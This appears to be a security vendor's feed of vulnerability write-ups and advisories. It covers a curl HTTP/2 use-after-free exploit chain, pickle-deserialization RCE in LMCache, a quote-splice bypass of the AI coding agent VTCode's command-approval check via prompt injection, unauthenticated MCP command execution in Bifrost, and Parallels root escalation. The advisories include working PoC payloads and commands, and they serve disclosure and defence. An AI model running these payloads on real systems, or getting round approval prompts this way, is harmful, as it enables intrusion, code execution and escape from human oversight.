One such repository hides a Base64-encoded string that, at first glance, appears to decrypt and execute a malware payload. However, our investigation confirmed that this is not actual malware. Instead, the script appears to change the victim's wallpaper to NSFW content.
## ![](/img/RealTimePostImage/post/php2shell/image6.png)
## **How Can JFrog Help?**
JFrog is tracking both vulnerabilities and helping organizations prepare to respond.
JFrog Xray and Catalog already includes CVE-2026-109618 and CVE-2026-109619 in its vulnerability intelligence, helping teams identify these issues through their existing security workflows.
![](/img/RealTimePostImage/post/php2shell/image7.png)
![](/img/RealTimePostImage/post/php2shell/image8.png)
Additionally, our security team has deployed contextual scanners to the determine the applicability of these CVEs for customers of JFrog Advanced Security.
## **IoCs**
**JFrog XRAY IDs**
| OS / Platform | CVE-2026-109618 | CVE-2026-109619 | | ----- | ----- | ----- | | Oracle | XRAY-1141250 | XRAY-1141258 | | Amazon | XRAY-1141248 | XRAY-1141256 | | Suse | XRAY-1141245 | XRAY-1141253 | | Ubuntu | XRAY-1141247 | XRAY-1141255 | | Alpine | XRAY-1141243 | XRAY-1141251 | | RedHat | XRAY-1141249 | XRAY-1141257 | | Minimos | XRAY-1141246 | XRAY-1141254 | | Debian | XRAY-1141737 | XRAY-1141738 | | Cpp | XRAY-1141244 | XRAY-1141252 |
[1]: https://github.com/php/php-src/security/advisories/GHSA-w8hw-w9fx-j79w [2]: https://github.com/php/php-src/security/advisories/GHSA-6wmf-4rv5-p3rp

item.title: CVE-2026-92392: curl HTTP/2 upload RCE
item.description: JFrog Security Research is tracking CVE-2026-92392, a HIGH-severity curl/libcurl use-after-free in HTTP/2 uploads that a malicious HTTPS server can turn into client-side remote code execution. We break down the bug, the published exploit, and the narrow conditions it needs.
item.content:encoded:
Recently, JFrog Security has been tracking a HIGH-severity curl (CVE-2026-92392), that was disclosed as part of a new release where at least 24 vulnerabilities were [patched](https://ubuntu.com/blog/curl-vulnerabilities-fixes-available). This has garnered a lot of attention due to its ability to cause Remote Code Execution. In this write-up, we will discuss the bug itself, the exploit itself, its mechanics, and the very specific prerequisites required for it to be anything else but a Denial of Service attack. The bug Description Is as follows: “Client-side remote code execution via a malicious HTTPS server.” ### **Who is affected by CVE-2026-92392:** * curl 8.12.0 to 8.22.0 * (libcurl and the curl tool) Introduced by commit [cd9107e0](https://github.com/curl/curl/commit/cd9107e0) (8.12.0) * Fixed curl 8.23.0 (commits [8b0744af](https://github.com/curl/curl/commit/8b0744af), [d9295430](https://github.com/curl/curl/commit/d9295430), [11d0b202](https://github.com/curl/curl/commit/11d0b202), [146698ea](https://github.com/curl/curl/commit/146698ea)) * A Curl Configuration that runs “curl -Z -T file https://attacker/x https://attacker/y” * Attacker position controls the HTTPS server (valid certificate, no -k needed) ## **Remediation** * **Upgrade to curl 8.23.0.** It ships the fix. This is the only complete fix. * **Workaround if you cannot upgrade:** force --http1.1 for uploads, or do not upload to untrusted servers. * **JFrog Xray users are protected:** Xray flags curl and libcurl 8.12.0 to 8.22.0 in scanned artifacts and dependencies. ## **Reproducing CVE-2026-92392** ### **The bug** The main fix

### **Background: HTTP/2 uploads in curl** When curl uploads over HTTP/2, the request body is streamed as DATA frames. If the server’s flow-control window closes mid-upload, curl parks the unsent body bytes in the [easy handle](https://everything.curl.dev/transfers/easyhandle.html)’s request structure and waits for a WINDOW_UPDATE. The stream stays open in nghttp2, with **stream_user_data** pointing at the Curl_easy handle. If the server resets such a stream with RST_STREAM(REFUSED_STREAM) or RST_STREAM(HTTP_1_1_REQUIRED), curl marks the transfer for retry and runs **multi_done()** to clean up the attempt. ### **What goes wrong in multi_done()** **multi_done()** ran its cleanup steps in the wrong order for this case: * **Curl_conn_ev_data_done()** runs first. It calls **req_flush()**, which tries to push the parked, unsent body bytes out before the connection event is considered done. * Flushing body bytes on a reset stream makes **h2_submit()** call **nghttp2_submit_request()** again. This registers a new stream (the “phantom stream”) in nghttp2, with **stream_user_data** = **data**, the same Curl_easy [easy handle](https://everything.curl.dev/transfers/easyhandle.html) that is being torn down. * **Curl_req_done()** and the rest of the cleanup then finish, and the Curl_easy [easy handle](https://everything.curl.dev/transfers/easyhandle.html) is freed. nghttp2 now holds a stream whose user data points to a freed heap. The next frame event on that stream (for example, at connection teardown, through **cf_h2_shutdown()** -> **on_begin_headers()** / **on_stream_frame()**) reads **data->mid** through the dangling pointer.

The ASAN trace confirms the read: **on_stream_frame()** (lib/http2.c:949) dereferences the freed easy during connection pool destroy. **In one sentence**: the transfer’s request object is retired **after** the connection filters are told the transfer is done, and the filter-side flush that runs in between can still push parked upload bytes onto the connection, which re-registers the stream with the easy handle that is being torn down. ### **The fix** Upstream fixed this on two levels: * [**8b0744af**](https://github.com/curl/curl/commit/8b0744af): **multi_done()** reorder (the diff shown above). **Curl_req_done()** now runs before the connection event handler, so no request-body flush can happen while the connection is being told the data is done. The phantom stream is never submitted. * [**d9295430**](https://github.com/curl/curl/commit/d9295430): defense in depth. nghttp2’s **stream_user_data** no longer holds a raw **Curl_easy\***. It holds an **h2_stream_ctx\***, and the easy handle is resolved through a lookup in the multi’s stream table. A stale stream ID resolves to nothing instead of dereferencing freed memory. ## **Exploiting CVE-2026-92392** ### **The attack scenario** The reporter’s exploit turns the UAF read into **system(cmd)** on the client. Victim: stock curl 8.22.0 release build (PIE, ASLR on), no -k, no debug flags. The Following is the RCE Scenario:

### **The exploit** TL;DR: A malicious server makes curl free memory it’s still using, plants its own data there, and hijacks it to run a command. In practice it’s a long shot: the app must use curl to fetch from one site and upload to another in parallel, with both sites attacker-controlled. #### **Step 1: connection topology** The victim runs a parallel upload: the transfer under attack is the upload itself, and a second, never-ending download keeps a connection busy while the attack plays out. Internally, curl tracks every transfer in an easy handle: one control structure that owns the request state for that transfer from start to finish. The upload's easy handle, **E_A**, is the target of the attack. The server forces curl to retry by resetting streams, so the attack unfolds over three rounds, one connection each. * **Round 1:** The upload and the download arrive together, multiplexed on one connection. The server reads the whole upload body (its exact size matters later), then resets both streams with RST_STREAM(REFUSED_STREAM). curl, told the server refused the requests, retries both. * **Round 2, the poisoned connection:** The download is answered slowly, forever: it keeps this connection alive and driving while the attack plays out. The retried upload is the aimed one. The server grants exactly j \* 16 KiB of flow-control window, lets that much body through, and stalls. With body bytes parked mid-send, it resets the stream. **multi_done()** then runs its cleanup in the wrong order and resurrects the parked request as a phantom stream, S', registered with E_A as its owner. * **Round 3:** The upload's final attempt is accepted in full and answered 200. The transfer completes, and curl frees E_A.

### **Step 2: heap grooming** The server needs to control what lands in **E_A**’s freed slot. curl gives the server two allocation primitives, both fully server-driven: * **TLS 1.3 NewSessionTicket:** OpenSSL stores the ticket with **OPENSSL_memdup(ticket, ticklen)**, a binary-safe, exact-size allocation. curl sets SSL_OP_NO_TICKET, but OpenSSL still processes (and memdups) unsolicited tickets. Each new ticket frees the previous buffer first, which makes this a controlled malloc/free pair of arbitrary content and size. * **HPACK blocks on the closed stream:** nghttp2 inflates header blocks sent on a closed stream and then ignores them, but the allocations still happen. Literals with incremental indexing stay in the dynamic table (persistent); literals without indexing are freed right away (transient). Dynamic table size updates (0 then 4096) free everything at a chosen moment. This gives precise control over specific glibc size classes (0x50, 0x210). Timing matters as much as sizes. The server fills the kernel accept queue with dummy connections so that the round 3 attempt’s SYN is dropped and nothing allocates between **free(E_A)** and the refill. It also holds the poisoned connection’s (round 2) TLS handshake until round 1 is torn down, so the poisoned connection’s first 16 KiB pool chunk lands adjacent to **E_A**’s old 64 KiB upload buffer.

### **Step 3: reclaim** The server sends a NewSessionTicket carrying a partial fake easy (magic 0xc0dedbad at \+0, the phantom stream’s id at \+4). OpenSSL frees the previous ticket buffer and memdups this one into **E_A**’s old slot. The slot is now occupied by attacker-controlled bytes, and S' still points at it. **Controlled Reclaim Achieved.** ### **Step 4: the leak (W1 over-read)** The exploit needs a libc base. It gets it with a heap over-read smuggled out inside curl’s own upload body: * HPACK eviction choreography frees a 0x50-class chunk so that it sits at the head of a poisoned bin. * A :status 100 HEADERS on S' makes curl **calloc()** a 67-byte header store, which lands exactly below the target sendbuf bufq chunk T (the poisoned connection’s outgoing network buffer). * A following header value (W1, sized for the 0x210 class) is placed by nghttp2’s rcbuf allocator so that it overflows into T’s header, writing controlled **r_offset** / **w_offset** values. * **chunk_read()** (lib/bufq.c) hands out **data\[r_offset:w_offset\]** with no **dlen** check. The server opens the windows and curl uploads T’s memory far past its real end: 0x182f0 bytes starting 0x18300 below the buffer. * The server scans the received bytes for glibc main_arena bin pointers (several candidates voting for one page-aligned base) to get the libc base. Fallback: &**Curl_nghttp2_free** appears in every rcbuf header, giving the libcurl base, and libc follows from the 2 MiB library load-order rule. **Information Disclosure complete.** ### **Step 5: the trigger** One TLS flight carries two records: * a NewSessionTicket with the final fake easy (2832 bytes, sized to re-occupy the same slot in the same SSL_read burst) * a WINDOW_UPDATE(0) on S', an invalid frame that makes nghttp2 call curl’s error path

**And bang! We have Arbitrary Code Execution!** ## **Conclusions** Due to the uncommon usage and attack scenario of `curl` outlined in the report, the report was rated high by the curl security team:

During our own investigation, we attempted to exploit the vulnerability under less restrictive conditions to evaluate whether its severity should be elevated from HIGH to CRITICAL. However, we were unable to achieve code execution outside the specific setup described. To our knowledge, the published proof-of-concept represents the minimum requirements necessary to trigger Remote Code Execution. The exploit is technically very impressive and is at least a plausible usage of curl. But frankly, in its current state, exploitation of this bug is a “once-in-a-blue-moon scenario”. Where an application uses curl to transfer data from one site, PUT it to another using parallelism, where both the source site and destination site arguments are attacker-controlled, this is quite a rare scenario. ## **How Does JFrog protect you** Xray does not stop at the version match. Its contextual analysis decides whether the vulnerable conditions are actually present in the artifact, and only then reports the CVE as **Applicable**. For **CVE-2026-92392**, the scanner correlates three pieces of evidence: * The libcurl binary is compiled with nghttp2 (HTTP/2) support, * The vulnerable function **curl_easy_setopt** is called, * A script drives the curl tool with an upload flag (-T, -d, -F, --json, or their long forms). If HTTP/2 support is found but neither usage condition is, Xray returns **Undetermined** instead of a false positive, since exploitation is still possible through direct CLI use or dynamically loaded libcurl bindings. This lets teams prioritize the artifacts where the exploit path is real. HTTP/2 is negotiated by ALPN, so any HTTPS upload to an attacker’s server is enough. The single-URL case (curl -T file https://attacker/x) gives a crash. Parallel mode (-Z) gives full RCE.

item.title: LMCache is vulnerable to Unauthenticated Remote Code Execution via Pickle Deserialization on the Multiprocess ZMQ Transport
item.description: CVE-2026-105192, CRITICAL, LMCache is vulnerable to Unauthenticated Remote Code Execution via Pickle Deserialization on the Multiprocess ZMQ Transport
item.content:encoded:
## Summary LMCache is vulnerable to Unauthenticated Remote Code Execution via Pickle Deserialization on the Multiprocess ZMQ Transport ## Component lmcache (github.com/LMCache/LMCache) ## Affected versions >= 0.3.9 ## Description LMCache multiprocess mode, also called distributed mode, opens an unauthenticated ZeroMQ ROUTER so worker processes can register and share KV cache blocks. The intended clients are sibling LMCache processes. There is no CURVE, ZAP, password, or message authentication on that socket. LMCache used only inside a vLLM process does not open this port. The transport binds to localhost unless the operator sets a routable address with `--host`, which is how multi-node deployments let peers connect. The 9.8 score is for that routable configuration. A stock single-host install that leaves the default bind is not reachable from other machines. Messages on the socket are msgpack. Extension code 1 is registered for `DeviceIPCWrapper` and is passed to `DeviceIPCWrapper.Deserialize` in `lmcache/v1/platform/base/ipc_wrapper.py`, which calls `pickle.loads`. That hook runs from `ext_hook` in `lmcache/v1/multiprocess/custom_types.py` while the server is still decoding `REGISTER_KV_CACHE` arguments, before the handler runs. A single unauthenticated ZMQ DEALER message to the transport port (default 5555) therefore executes code as the user the LMCache process runs as. Official container images run that process as root. The decode path shipped in v0.3.9. It is still present in the latest PyPI release, v0.5.5, in the v0.5.6 release candidates through v0.5.6rc3, and on the dev branch as of 2026-10-07. No fixed version has been published. ## PoC
**Step 1 - Start multiprocess mode bound to a routable address**
This is the documented multi-node setting. The ZMQ transport listens on port 5555. ``` python -m lmcache.v1.multiprocess.http_server \ --http-host 127.0.0.1 --http-port 8080 \ --host 0.0.0.0 --port 5555 \ --l1-size-gb 0.25 --eviction-policy LRU \ --hash-algorithm blake3 --instance-id mp-node-01 ```
**Step 2 - Build a REGISTER_KV_CACHE frame whose cache slot is a pickle**
Payload slot 1 is a msgpack extension with code 1. The server unpickles that body while it is still decoding arguments. The command writes `id` to `/tmp/zmq_pwn`. ``` import os import pickle import msgspec import zmq class EvilPayload: def __init__(self, cmd): self.cmd = cmd def __reduce__(self): return (os.system, (self.cmd,)) evil_pickle = pickle.dumps(EvilPayload("id > /tmp/zmq_pwn 2>&1")) REGISTER_KV_CACHE = 1 EXT_CODE = 1 NUM_PAYLOADS = 7 KVCACHE_INDEX = 1 b_uid = msgspec.msgpack.encode(0) b_type = msgspec.msgpack.encode(REGISTER_KV_CACHE) payloads = [msgspec.msgpack.encode(None)] * NUM_PAYLOADS payloads[0] = msgspec.msgpack.encode(0) payloads[KVCACHE_INDEX] = msgspec.msgpack.encode( [msgspec.msgpack.Ext(EXT_CODE, evil_pickle)] ) frames = [b_uid, b_type, *payloads] ```
**Step 3 - Send the frame**
``` ctx = zmq.Context() s = ctx.socket(zmq.DEALER) s.connect("tcp://127.0.0.1:5555") s.send_multipart(frames) ```
The pickle runs during argument decode. The server then logs a type error for `REGISTER_KV_CACHE` because the handler expected a `DeviceIPCWrapper` and received the return value of `os.system`. That error is after the command has already run.
**Step 4 - Confirm the command ran as the LMCache user**
``` cat /tmp/zmq_pwn ```
Expected output on an official image, where the process runs as root: ``` uid=0(root) gid=0(root) groups=0(root) ``` ## Vulnerability Mitigations No fixed release is available as of 2026-10-07. The latest PyPI release is v0.5.5, and v0.5.6rc3 and the dev branch still call `pickle.loads` from `DeviceIPCWrapper.Deserialize`. Stop passing network bytes to pickle. Replace the serializer behind msgpack extension code 1 with a safe format, and do not call `pickle.loads` on data that arrived from an unauthenticated peer. Authenticate the ZMQ transport, for example with CURVE or an HMAC over each message, and refuse to bind a routable address unless that authentication is configured. Until a release includes that change, do not set `--host` to a routable address. Keep the multiprocess port on localhost or on a trusted cluster network. Limiting the port with a firewall reduces who can reach it. Any host that can open a connection to the port can still run code as the LMCache user. ## References https://www.cve.org/CVERecord?id=CVE-2026-105192 https://github.com/LMCache/LMCache https://pypi.org/project/lmcache/ https://github.com/LMCache/LMCache/blob/v0.5.5/lmcache/v1/platform/base/ipc_wrapper.py https://github.com/LMCache/LMCache/blob/v0.3.9/lmcache/v1/multiprocess/custom_types.py

item.title: VTCode is vulnerable to Arbitrary Command Execution via an ANSI-C Quote Bypass of the find Approval Check
item.description: CVE-2026-104247, MEDIUM, VTCode is vulnerable to Arbitrary Command Execution via an ANSI-C Quote Bypass of the find Approval Check
item.content:encoded:
## Summary VTCode is vulnerable to Arbitrary Command Execution via an ANSI-C Quote Bypass of the find Approval Check ## Component vtcode (github.com/vinhnx/VTCode) ## Affected versions < 0.171.5 ## Description VTCode learns a family of safe `find` commands after a person approves three ordinary finds under the same workspace subdirectory. Later commands that share that family key run with no further prompt. The check that keeps destructive options out of the family compares tokens exactly (`-exec`, `-delete`, and a short list of siblings) in `is_destructive_find_option` inside `src/agent/runloop/unified/tool_routing/shell_approval.rs`. An empty ANSI-C quote spliced into the flag (`-exe$''c`) does not match that list, so `learned_find_pattern` still treats the command as a safe find. Once the family has been learned, `prompt_tool_permission` auto-approves it and the shell runs it. The proven result is command execution as the user running VTCode, without a new approval prompt. Reaching that point takes a local session, those prior approvals, and something that can steer the agent, such as indirect prompt injection. ## PoC
**Step 1 - Install a vulnerable VTCode and open a trusted workspace**
Use VTCode before 0.171.5 with the default approval prompts (HITL) enabled. The workspace needs a `src` directory. ``` cargo install vtcode --version 0.171.4 ```
**Step 2 - Approve three distinct safe finds**
Ask the agent to run each of these, and approve each prompt. They must share the same top-level directory: ``` find src -type f -name '*.rs' find src -type d find src -name foo ```
**Step 3 - Confirm the family now auto-approves**
Ask for another ordinary find under `src`. VTCode should run it with no new prompt. ``` find src -type f ```
**Step 4 - Send the spliced find**
``` find src -maxdepth 0 -exe$''c touch /tmp/VT_BYPASS_POC {} + ```
**Step 5 - Confirm the command ran without a prompt**
``` ls -l /tmp/VT_BYPASS_POC ```
Expected output: ``` -rw-r--r-- 1 0 /tmp/VT_BYPASS_POC ```
On 0.171.5 or later, the same command does not inherit the safe-find family and still requires approval. ## Vulnerability Mitigations Upgrade to VTCode 0.171.5 or later. The release marks every version below 0.171.5 as affected. An earlier change in 0.141.12 rejected this `$''` splice only on a bare `find`. The follow-up in 0.171.5 (https://github.com/vinhnx/VTCode/pull/778, commit 5840697cd0dc8f94b9b53d88185329eecba8de11) is the first release the advisory treats as patched. It also refuses family learning for path-qualified `find` (`./find`, `/usr/bin/find`), mixed-case or quote-spliced flags, wrapper and environment prefixes, and compound commands. Until you upgrade, do not rely on learned find approvals. Treat a workspace where an untrusted prompt can drive the agent as able to run shell commands after a few ordinary finds have been approved. ## References https://github.com/vinhnx/VTCode/security/advisories/GHSA-r249-hpfx-x2w7 https://github.com/vinhnx/VTCode/pull/778 https://github.com/vinhnx/VTCode/commit/5840697cd0dc8f94b9b53d88185329eecba8de11 https://github.com/vinhnx/VTCode/releases/tag/0.171.5 https://www.cve.org/CVERecord?id=CVE-2026-104247 https://github.com/vinhnx/VTCode

item.title: Bifrost is vulnerable to Unauthenticated Remote Code Execution via MCP Stdio Client Registration
item.description: CVE-2026-90898, CRITICAL, Bifrost is vulnerable to Unauthenticated Remote Code Execution via MCP Stdio Client Registration
item.content:encoded:
## Summary Bifrost is vulnerable to Unauthenticated Remote Code Execution via MCP Stdio Client Registration ## Component Bifrost (github.com/maximhq/bifrost/transports) ## Affected versions < 2.1.0 ## Description Bifrost registers MCP clients through its management API. A stdio client is a command plus args. Bifrost starts that program in the gateway the moment the client is added. No MCP handshake required. The default is governance.auth_config.is_enabled=false. Auth off means every caller is a local admin. One unauthenticated POST /api/mcp/client is enough to run a program as the Bifrost process user (appuser on the official image). The HTTP request may time out. The process is already running. transports/v2.1.0 refuses an unauthenticated stdio registration with 403. transports/v2.0.0 still allows it. The 1.6.x line through 1.6.11 does not contain the fix. ## PoC
**Step 1 - Run Bifrost with management authentication disabled**
Start a Bifrost HTTP transport before 2.1.0 with the default governance.auth_config.is_enabled=false. The management API must be reachable on the host and port you use below (the binary default is localhost:8080): ``` curl -fsS http://127.0.0.1:8080/health ```
**Step 2 - Register a stdio MCP client**
No authentication header is required. A request timeout is expected while Bifrost waits for an MCP handshake. The timeout does not mean the command failed to start. ``` curl --max-time 5 --silent --show-error \ --request POST http://127.0.0.1:8080/api/mcp/client \ --header 'Content-Type: application/json' \ --data '{ "name": "rceproof", "connection_type": "stdio", "auth_type": "none", "stdio_config": { "command": "/bin/sh", "args": ["-c", "echo PROVEN > /tmp/bifrost-mcp-rce; sleep 60"] }, "tools_to_execute": ["*"] }' || true ```
**Step 3 - Confirm the command ran**
``` cat /tmp/bifrost-mcp-rce ```
Expected output: ``` PROVEN ```
On 2.1.0 or later, the same POST returns 403 and the marker is not written. ## Vulnerability Mitigations Upgrade Bifrost HTTP transport to 2.1.0 or later. The fix (https://github.com/maximhq/bifrost/pull/6757) returns 403 for unauthenticated stdio MCP client registration when dashboard authentication is disabled or unconfigured. Authenticated admins can still add stdio clients. The 1.6.x line through 1.6.11 and transports/v2.0.0 do not include this change. Until you upgrade, set governance.auth_config.is_enabled to true, use strong administrator credentials, and keep the management listener off untrusted networks. Treat any exposed instance that ran with authentication disabled as compromised and rotate virtual keys and provider credentials. ## References https://www.cve.org/CVERecord?id=CVE-2026-90898 https://github.com/maximhq/bifrost/pull/6757 https://github.com/maximhq/bifrost/commit/12e170352bd25eab1ae9ba16611f1797d1fd8fdc https://github.com/maximhq/bifrost/releases/tag/transports/v2.1.0 https://github.com/maximhq/bifrost

item.title: Parallels Desktop is vulnerable to a Local Privilege Escalation via Appliance Extract Argument Injection
item.description: CVE-2026-90894, HIGH, Parallels Desktop is vulnerable to a Local Privilege Escalation via Appliance Extract Argument Injection
item.content:encoded:
## Summary Parallels Desktop is vulnerable to a Local Privilege Escalation via Appliance Extract Argument Injection ## Component Parallels Desktop for Mac ## Affected versions < 27.0.0 ## Description Parallels Desktop runs prl_disp_service as root. Local clients reach it on the world-writable socket /var/run/prl_disp_service.socket. PrlSrv_LoginLocal accepts peer credentials. No Parallels signature. No admin group. After login, PrlSrv_InstallAppliance lets you pick the appliance folder (sVmParentPath). The daemon unpacks with one string, tar -xf "%1" -C "%2", then Qt QProcess::splitCommand chops that string into words. A quote in the folder name closes early. The leftover text becomes extra tar flags. macOS tar --use-compress-program= runs the named program as root. I got a root shell on 26.4.0 (57513). 27.0.0 starts tar as a fixed argv list, so the same quote stays a folder name and does not run code. Hosts that stay on the 26.x line, including 26.4.2, do not have that extract change. ## PoC
**Step 1 - Confirm the build and the dispatcher socket**
``` defaults read "/Applications/Parallels Desktop.app/Contents/Info" CFBundleShortVersionString ls -l /var/run/prl_disp_service.socket ```
Expected output on a vulnerable host: ``` 26.4.0 srwxrwxrwx 1 root daemon 0 ... /var/run/prl_disp_service.socket ```
**Step 2 - Log in as a non-admin user**
From an unsigned process, call PrlSrv_LoginLocal against the dispatcher, then read PrlUsrCfg_IsLocalAdministrator. The login returns 0. The administrator flag stays 0.
**Step 3 - Install an appliance into a quote-breaking folder**
Build a small tar and set PackageURL to a file:// path with a matching PackageMd5. Pass sVmParentPath as a real directory whose name embeds a quote and a tar flag: ``` /tmp/sprl_p_" --use-compress-program=/tmp/u " ```
Call PrlSrv_InstallAppliance. On 26.4.0, QProcess::splitCommand turns the text after the quote into extra argv. macOS tar then runs /tmp/u as root.
**Step 4 - Check the result**
On 26.4.0 the named program runs as uid 0. InstallAppliance may return -41508 after extract. That is expected. Proof is the root marker, not the job status.
On 27.0.0 the same folder name is created on disk as a directory. It does not become tar flags. Root does not run the script. ## Vulnerability Mitigations Upgrade to Parallels Desktop 27.0.0 or later. Until every host is on 27.0.0 or later, restrict local login on those Macs. Any local account on a vulnerable install can reach the dispatcher socket. ## References https://www.cve.org/CVERecord?id=CVE-2026-90894 https://kb.parallels.com/en/131168 https://www.parallels.com/products/desktop/
